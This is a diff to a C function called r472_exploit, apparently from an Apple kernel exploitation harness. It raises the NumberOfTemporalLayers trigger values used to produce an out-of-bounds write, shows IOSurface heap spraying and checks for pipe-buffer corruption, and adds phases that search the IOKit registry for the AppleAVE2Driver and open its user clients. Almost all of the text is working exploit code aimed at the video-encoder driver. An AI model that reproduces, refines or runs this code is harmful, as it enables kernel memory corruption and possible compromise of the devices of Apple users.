@@ -17435,7 +17435,7 @@ static void r472_exploit(void) {
     rlog("  --- Phase A: Probe NumberOfTemporalLayers values ---\n");
     fflush(stdout);
 
-    int test_vals[] = {4, 8, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096, 8192};
+    int test_vals[] = {4, 64, 512, 4096, 8192, 10000, 12000, 14000, 15000, 16000, 16463};
     int n_tests = sizeof(test_vals) / sizeof(test_vals[0]);
 
     for (int i = 0; i < n_tests; i++) {
@@ -17561,7 +17561,7 @@ static void r472_exploit(void) {
     rlog("    IOSurface spray: %d / %d created\n", surf_ok, R472_SPRAY_SURFS);
     fflush(stdout);
 
-    int trigger_vals[] = {4096, 8192};
+    int trigger_vals[] = {12000, 16000, 16463};
     int n_trigger = sizeof(trigger_vals) / sizeof(trigger_vals[0]);
 
     for (int ti = 0; ti < n_trigger; ti++) {
@@ -17655,6 +17655,89 @@ static void r472_exploit(void) {
         rlog("    No pipe corruption detected (OOB may not reach pipe buffers)\n");
     } else {
         rlog("    *** %d pipes corrupted — OOB write confirmed! ***\n", corrupted);
+    }
+    fflush(stdout);
+
+    /* ---- Phase E: Try direct AVE2 user client ---- */
+    rlog("\n  --- Phase E: Direct AppleAVE2Driver user client ---\n");
+    fflush(stdout);
+
+    const char *ave_names[] = {
+        "AppleAVE2Driver", "AppleAVE2", "AVEVideoEncoder",
+        "AppleH16AVE", "AppleAVE", NULL
+    };
+    io_service_t ave_svc = 0;
+    for (int i = 0; ave_names[i]; i++) {
+        ave_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching(ave_names[i]));
+        if (ave_svc) {
+            rlog("    Found service: %s (port=%u)\n", ave_names[i], ave_svc);
+            break;
+        }
+    }
+    if (!ave_svc) {
+        io_iterator_t iter = 0;
+        kern_return_t kr = IOServiceGetMatchingServices(kIOMasterPortDefault,
+            IOServiceMatching("IOService"), &iter);
+        if (kr == KERN_SUCCESS) {
+            io_service_t s;
+            int count = 0;
+            while ((s = IOIteratorNext(iter)) && count < 20) {
+                io_name_t name;
+                IORegistryEntryGetName(s, name);
+                if (strstr(name, "AVE") || strstr(name, "ave") ||
+                    strstr(name, "Video") || strstr(name, "Encoder")) {
+                    rlog("    Found: %s (port=%u)\n", name, s);
+                    if (!ave_svc) ave_svc = s;
+                    else IOObjectRelease(s);
+                    count++;
+                } else {
+                    IOObjectRelease(s);
+                }
+            }
+            IOObjectRelease(iter);
+        }
+    }
+
+    if (ave_svc) {
+        for (int t = 0; t < 4; t++) {
+            io_connect_t uc = 0;
+            kern_return_t kr = IOServiceOpen(ave_svc, mach_task_self(), t, &uc);
+            rlog("    IOServiceOpen type=%d: kr=0x%x uc=%u\n", t, kr, uc);
+            if (kr == KERN_SUCCESS && uc) {
+                rlog("    *** AVE2 user client opened (type %d)! ***\n", t);
+                IOServiceClose(uc);
+            }
+        }
+        IOObjectRelease(ave_svc);
+    } else {
+        rlog("    No AVE service found in IOKit registry\n");
+    }
+
+    /* ---- Phase F: Enumerate all IOKit services with 'encode' ---- */
+    rlog("\n  --- Phase F: IOKit encoder services ---\n");
+    fflush(stdout);
+    {
+        io_iterator_t iter = 0;
+        kern_return_t kr = IOServiceGetMatchingServices(kIOMasterPortDefault,
+            IOServiceMatching("IOService"), &iter);
+        if (kr == KERN_SUCCESS) {
+            io_service_t s;
+            int found = 0;
+            while ((s = IOIteratorNext(iter))) {
+                io_name_t name;
+                IORegistryEntryGetName(s, name);
+                if (strstr(name, "AVE") || strstr(name, "ave") ||
+                    strstr(name, "Encode") || strstr(name, "encode") ||
+                    strstr(name, "H26") || strstr(name, "HEVC") ||
+                    strstr(name, "VXE") || strstr(name, "vxe")) {
+                    rlog("    [%d] %s\n", found++, name);
+                }
+                IOObjectRelease(s);
+            }
+            IOObjectRelease(iter);
+            if (found == 0) rlog("    No encoder services found\n");
+        }
     }
 
     rlog("\n=== r472 done ===\n");
